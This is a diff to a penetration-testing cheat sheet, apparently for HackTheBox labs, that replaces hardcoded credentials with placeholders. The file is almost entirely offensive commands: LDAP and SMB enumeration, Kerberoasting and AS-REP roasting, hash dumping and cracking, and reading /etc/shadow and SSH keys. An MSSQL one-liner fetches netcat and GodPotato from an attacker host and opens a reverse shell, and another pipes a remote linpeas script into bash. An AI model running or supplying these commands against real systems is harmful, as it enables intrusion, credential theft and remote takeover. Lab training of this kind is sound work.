@@ -53,11 +53,11 @@ ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)"
 ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=dn: ).*' | grep -oP '(^[^@]+)'
 ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=userPrincipalName: ).*' | grep -oP '(^[^@]+)'
 ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=description: ).*'
-ldapsearch -H ldap://$DC/ -D "$DOM\P.Rosa" -w 'Rosaisbest123' -b "" -s base "(objectClass=*)" | grep -v 'supported'
-ldapsearch -H ldap://$DC/ -D "$DOM\P.Rosa" -w 'Rosaisbest123' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
+ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "" -s base "(objectClass=*)" | grep -v 'supported'
+ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
 
 [*] Kerberos
-impacket-getST -spn $DC $DOM/'USERNAME':'PASSWORD'
+impacket-getST -spn $DC $DOM/'$USERNAME':'$PASSWORD'
 
 nano /etc/krb5.conf
 [libdefaults]
@@ -73,24 +73,23 @@ $DOM = {
 .$DOM = $DOM
 $DOM = $DOM
 
-export KRB5CCNAME='/home/me/USERNAME@dc01@VINTAGE.HTB.ccache'
-kinit -c '/home/me/USERNAME@dc01@VINTAGE.HTB.ccache' 'USERNAME@VINTAGE.HTB'
+export KRB5CCNAME='/home/me/$USERNAME@dc01@VINTAGE.HTB.ccache'
+kinit -c '/home/me/$USERNAME@dc01@VINTAGE.HTB.ccache' '$USERNAME@VINTAGE.HTB'
 klist
 
 impacket-GetADUsers -dc-host $DC -k $DOM/
 impacket-GetNPUsers -usersfile usernames $DOM/ -dc-ip "$TARGET"
-impacket-GetUserSPNs -request-user anna -dc-ip "$TARGET" $DOM/username:password
-impacket-GetUserSPNs -no-preauth anna -usersfile usernames -dc-host "$TARGET" $DOM/
-impacket-GetUserSPNs -request -dc-ip "$TARGET" $DOM/username:password
+impacket-GetUserSPNs -request-user '$USERNAME' -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
+impacket-GetUserSPNs -no-preauth '$USERNAME' -usersfile usernames -dc-host "$TARGET" $DOM/
+impacket-GetUserSPNs -request -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
 
 [*] bloodhound-python
-bloodhound-python -c all -u 'username' -p 'password' -d "$DOM" -dc "$DC" -ns "$TARGET"
-bloodhound-python -c default -u 'username' -p 'password' -d "$DOM" -dc "$DC" -ns "$TARGET"
+bloodhound-python -c all -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
+bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
 
 [*] FTP
-nxc ftp "$TARGET" --port 21 -u 'anonymous' -p 'anonymous' --ls
-ftp "$TARGET"
-anonymous
+nxc ftp "$TARGET" --port 21 -u '$USERNAME' -p '$PASSWORD' --ls
+ftp '$USERNAME'@"$TARGET"
 anonymous
 ls -a
 binary
@@ -98,8 +97,8 @@ ascii
 
 [*] SMB
 impacket-samrdump "$TARGET"
-nxc smb "$TARGET" -u usernames -p passwords --rid-brute 10000
-nxc smb "$TARGET" -u usernames -p passwords --shares
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORDS' --rid-brute 10000
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORDS' --shares
 
 [*] MySQL
 mysql -h "$TARGET" -u root@localhost -e 'show databases;'
@@ -277,8 +276,8 @@ sessions -i 1
 ssh-keygen -f sshkey -N ''; cat sshkey.pub
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
 ssh-add -D
-bob@$TARGET -i sshkey.pub
-bob@$TARGET
+$USERNAME@$TARGET -i sshkey.pub
+$USERNAME@$TARGET
 
 [*] SMB
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set CreateSession true; run"
@@ -287,14 +286,13 @@ shares -i C$
 cd programdata
 upload nc.exe
 
-impacket-smbclient $DOM/'user':'password'@$TARGET
+impacket-smbclient $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 shares
 use
 
 [*] RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
-xfreerdp /u:'bob' /p:'pass123' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
-
+xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
 
 [*] MSSQL
 netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlcache -f http://$MYIP:8088/runascs.exe C:\programdata\runascs.exe;certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe; certutil -urlcache -f http://$MYIP:8088/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe; C:\programdata\runascs.exe sql_svc WqSZAF6CysDQbGb3 --logon-type 5 -b "C:\programdata\GodPotato-NET4.exe -cmd \"cmd /c C:\programdata\nc.exe -e cmd.exe $MYIP 4444\""'
@@ -305,7 +303,7 @@ sessions -i 1 -C 'getsystem'
 sessions -i 1
 
 [*] impacket
-impacket-changepasswd -debug -dc-ip $TARGET $DC/"$USERNAME":"$PASSWORD"@$TARGET -newpass 'NewPassword123!'
+impacket-changepasswd -debug -dc-ip $TARGET $DC/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'NewPassword123!'
 
 # Escalation 
 
@@ -328,8 +326,8 @@ grep -r -E 'conf' /var/www
 cat ~/.ssh/id_rsa
 cat /etc/shadow
 curl $MYIP:8088/linpeas.sh | bash
-su evelyn --preserve-environment
-ssh bob@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
+su $USERNAME --preserve-environment
+ssh $USERNAME@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
 cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
 find / -readable -name 'root.txt' -exec echo {} \; -exec cat {} \; 2>/dev/null
 
@@ -359,17 +357,17 @@ download SAM
 download SYSTEM
 impacket-secretsdump LOCAL -sam SAM -system SYSTEM
 echo 'Administrator:500:...................' > hashes
-hashcat -m 1000 -a 0 hashes rockyou
+hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
 
 [*] Rubeus
 Rubeus.exe kerberoast
-nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=rockyou --format=krb5tgs
+nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs
 Rubeus.exe asreproast
-nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=rockyou --format=krb5asrep
+nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep
 
 [*] evil-winrm
-evil-winrm -i "$TARGET" -u 'username' -p 'password'
-evil-winrm -i "$TARGET" -u 'username' -H 'hash'
+evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
+evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 [*] url / .lnk exploits
 click.url
@@ -388,4 +386,4 @@ powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programd
 powershell Import-Module C:\programdata\powerview.ps1
 Get-NetDomain
 Get-LocalUser
-Set-DomainObject -Identity USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
+Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
